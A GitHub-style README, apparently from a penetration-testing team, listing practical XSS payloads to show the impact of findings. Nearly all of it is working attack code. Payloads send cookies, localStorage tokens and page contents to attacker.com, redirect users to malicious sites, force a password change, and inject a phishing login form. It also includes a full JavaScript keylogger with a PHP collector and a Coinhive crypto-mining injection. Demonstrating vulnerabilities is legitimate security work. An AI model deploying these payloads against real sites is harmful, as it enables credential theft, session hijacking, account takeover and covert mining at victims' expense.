# practical-xss

Prove the real risk of XSS vulnerabilities with the following scenarios

### Stealing cookies/token
```<script>new Image().src=`//attacker.com/?o=${document.cookie}`</script>```

```<svg/onload=fetch(`//attacker.com/?o=${document.cookie}&o2=${localStorage.getItem('token')}`)>``` ***//change the getItem***

```<img src=x onerror="document.location='https://attacker.com?o='+window.localStorage.getItem('token')">``` ***//change the getItem***

### Stealing page data
#### Specific id
```<script>new Image().src=`//attacker.com/?o=${document.getElementById('sensetive_information').innerHTML}`</script>```

```<script>new Image().src="//attacker.com/?o="+document.getElementById('sensetive_information').innerHTML;</script>```

#### Specific class
```<script>new Image().src=`//attacker.com/?o=${document.getElementsByClassName('sensetive_information')[0].innerText}`</script>```

```<script>new Image().src="//attacker.com/?o="+document.getElementsByClassName('sensetive_information')[0].innerText;</script>```

#### Entire page
```<script>new Image().src=`//attacker.com/?o=${encodeURI(document.body.innerHTML)}`</script>```

```<script>new Image().src="//attacker.com/?o="+encodeURI(document.body.innerHTML)</script>```

### Redirect users to malicious sites
```<script>alert`Please login again`;window.location.href="http://attacker.com";</script>```

```<script>if(confirm("Please login again!"))document.location='http://attacker.com/';</script>```

### Perform unauthorized activities
```
<script>
	var xhr = new XMLHttpRequest();
	xhr.open('POST','http://victim.com/changePassword',true);
	xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
	xhr.send('email=admin@victim.com&newPassword=Aa123456');
</script>
```

### Fake login form
```<h3>Please login to proceed</h3><form action=http://attacker.com/>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>```

### Key-logger

**xss.js**
```
var l = "";
document.onkeypress = function (e) {
    l += e.key;
    var req = new XMLHttpRequest();
    req.open("POST","http://attacker.com/keylog.php", true);
    req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    req.send("data=" + l);
}
```

**keylog.php**
```
<?php
if(!empty($_POST['data'])){
	$logfile = fopen('data.txt','a+');
	fwrite($logfile, $_POST['data'] . "\n");
	fclose($logfile);
}
?>
```

Inject this:
<script src="//attacker.com/xss.js"></script>

### Crypto Mining
```<script src="https://coin-hive.com/lib/coinhive.min.js">var miner = new CoinHive.Anonymous('thisistest');miner.start();</script>```

It's important to show a POC of an extension that detects a crypto mining script, you can do this with Chrome extensions like [MinerBlock](https://chrome.google.com/webstore/detail/minerblock/emikbbbebcdfohonlaifafnoanocnebl?hl=en)


###### References
1. https://pentest-tools.com/blog/xss-attacks-practical-scenarios/
2. https://github.com/chentetran/xss-keylogger/blob/master/keylogscript.html
<br/><br/>
**EY Cyber - Hacktics team**
